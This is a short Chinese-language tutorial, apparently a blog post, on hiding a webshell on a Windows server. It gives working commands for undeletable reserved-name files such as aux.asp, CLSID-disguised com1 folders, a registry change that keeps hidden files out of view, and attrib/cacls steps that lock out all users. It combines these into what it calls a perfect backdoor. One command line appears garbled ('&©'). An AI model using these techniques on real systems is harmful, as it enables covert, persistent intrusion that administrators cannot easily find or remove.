## windows下隐藏webshell的方法  

1、利用保留字隐藏  
windows系统有些保留文件夹名，windows系统不允许用这些名字命名文件夹，比如：  

`aux|prn|con|nul|com1|com2|com3|com4|com5|com6|com7|com8|com9|lpt1|lpt2|lpt3|lpt4|lpt5|lpt6|lpt7|lpt8|lpt`等。  

我们可以这么做：  
```
echo code>>d:\test.asp

copy d:\test.asp \\.\d:\aux.asp
```

这样就可以创建一个无法删除的文件了，这个文件在图形界面下是无法删除的，甚至del d:\aux.asp也无法删除    

2、利用clsid隐藏  

windows中每一个程序都有一个clsid，创建一个文件夹，取名x.{21ec2020-3aea-1069-A2dd-08002b30309d}这时候打开这个文件夹就是控制面板了，为了更隐蔽些我们可以结合windows保留字使用以下命令：  

`md \\.\d:\com1.{21ec2020-3aea-1069-A2dd-08002b30309d}`  

这样生成的文件夹无法删除，无法修改,无法查看  

3、利用注册表隐藏  
注册表路径：  

`HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\explorer＼Advanced\Folder\Hidden\SHOWALL`

在这个路径下有一个`CheckedValue`的键值，把他修改为`0`，如果没有`CheckValue`这个key直接创建一个，将他赋值为`0`，然后创建的隐藏文件就彻底隐藏了，即时在文件夹选项下把“显示所有文件”也不能显示了。  

我们再结合保留字和clsid两种方法生成一个后门。  

首先我们创建一个目录`md\\.\d:\com1.{21ec2020-3aea-1069-A2dd-08002b30309d}`  

接着`attrib -s -h -a -r x:\RECYCLED&© x:\RECYCLED \\.\d:\com1.{21ec2020-3aea-1069-A2dd-08002b30309d}\`

为了保险起见，我们在这个回收站丢点东西证明它是在运作的`echo exec code>>\\.\d:\com1.{21ec2020-3aea-1069-A2dd-08002b30309d}\RECYCLED\aux.asp` 

好了一个超级猥琐的后门诞生了，但，并不完美，或许还可以这么做  

```
attrib \\.\d:\com1.{21ec2020-3aea-1069-A2dd-08002b30309d}\RECYCLED\aux.asp +h +s +r +d /s /d
cacls /E /G Everyone:N
```

一个基于system桌面权限以及任何webshell，以及Cmd下的都无法查看，修改，和Del的完美后门诞生了。